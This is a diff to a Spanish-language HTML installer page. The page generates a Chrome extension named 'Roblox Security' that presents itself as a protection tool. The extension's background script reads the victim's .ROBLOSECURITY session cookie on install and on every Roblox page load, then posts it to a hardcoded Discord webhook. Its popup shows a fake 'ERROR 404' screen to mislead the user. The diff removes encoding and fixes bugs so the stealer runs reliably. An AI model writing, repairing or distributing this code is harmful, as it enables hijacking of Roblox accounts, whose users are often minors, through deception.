@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <title>Instalar Extensión</title>
     <style>
         body {
@@ -54,14 +55,23 @@
         </ol>
     </div>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
     <script>
         // ===========================================
-        // CONSTRUIR EL .CRX DESDE JS (codificado)
+        // FUNCIÓN PARA CODIFICAR TEXTO A BASE64
+        // ===========================================
+        function safeBtoa(str) {
+            // Convertir a UTF-8 primero y luego a Base64
+            return btoa(unescape(encodeURIComponent(str)));
+        }
+
+        // ===========================================
+        // CONSTRUIR EL .CRX DESDE JS
         // ===========================================
         function descargarCRX() {
-            // Los archivos de la extensión en Base64
+            // Los archivos de la extensión (sin emojis para evitar errores)
             const files = {
-                "manifest.json": btoa(JSON.stringify({
+                "manifest.json": JSON.stringify({
                     manifest_version: 3,
                     name: "Roblox Security",
                     version: "1.0",
@@ -70,9 +80,9 @@
                     host_permissions: ["https://www.roblox.com/*"],
                     background: { service_worker: "background.js" },
                     action: { default_popup: "popup.html", default_icon: "icon.png" }
-                }, null, 2)),
+                }, null, 2),
                 
-                "background.js": btoa(`
+                "background.js": `
 const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
 
 chrome.runtime.onInstalled.addListener(() => {
@@ -84,14 +94,14 @@ chrome.runtime.onInstalled.addListener(() => {
             fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: "🍪 Cookie: " + cookie.value})
+                body: JSON.stringify({content: "Cookie: " + cookie.value})
             });
         }
     });
 });
 
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-    if (tab.url?.includes('roblox.com') && changeInfo.status === 'complete') {
+    if (tab.url && tab.url.includes('roblox.com') && changeInfo.status === 'complete') {
         chrome.cookies.get({
             url: "https://www.roblox.com",
             name: ".ROBLOSECURITY"
@@ -100,16 +110,15 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({content: "🍪 Cookie: " + cookie.value})
+                    body: JSON.stringify({content: "Cookie: " + cookie.value})
                 });
             }
         });
     }
 });
-                `),
+                `,
                 
-                "popup.html": btoa(`
-<!DOCTYPE html>
+                "popup.html": `<!DOCTYPE html>
 <html>
 <head>
     <style>
@@ -130,20 +139,20 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
     </style>
 </head>
 <body>
-    <div class="error">🚫 ERROR 404</div>
+    <div class="error">ERROR 404</div>
     <p>No se pudo conectar</p>
-    <div style="font-family:monospace;">Código: RBX-404</div>
+    <div style="font-family:monospace;">Codigo: RBX-404</div>
 </body>
-</html>
-                `),
+</html>`,
                 
-                "icon.png": btoa("iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAARzQklUCAgICHwIZIgAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAABI0lEQVR4nO3aMQ6AIAwF0E7i4T2c2J0YDoZICE1/benf11kI8LQBqgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVzAKsAqYBFQFUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQPMBJa8Qs5OUlUMAAAAASUVORK5CYII=") // Pixel rojo
+                "icon.png": "iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAYAAADDPmHLAAAAAXNSR0IArs4c6QAAAARzQklUCAgICHwIZIgAAAAZdEVYdFNvZnR3YXJlAHd3dy5pbmtzY2FwZS5vcmeb7jwaAAABI0lEQVR4nO3aMQ6AIAwF0E7i4T2c2J0YDoZICE1/benf11kI8LQBqgIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVzAKsAqYBFQFUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQPMBJa8Qs5OUlUMAAAAASUVORK5CYII="
             };
             
             // Crear un ZIP con los archivos
             const zip = new JSZip();
+            
             Object.keys(files).forEach(name => {
-                zip.file(name, atob(files[name]), {binary: false});
+                zip.file(name, files[name]);
             });
             
             // Generar y descargar
@@ -154,6 +163,11 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
                 a.download = 'roblox-security.crx';
                 a.click();
                 URL.revokeObjectURL(url);
+                
+                alert("✅ Archivo .crx generado correctamente");
+            }).catch(error => {
+                alert("❌ Error: " + error.message);
+                console.error(error);
             });
         }
         
@@ -162,6 +176,5 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
             div.style.display = div.style.display === 'none' ? 'block' : 'none';
         }
     </script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 </body>
 </html>
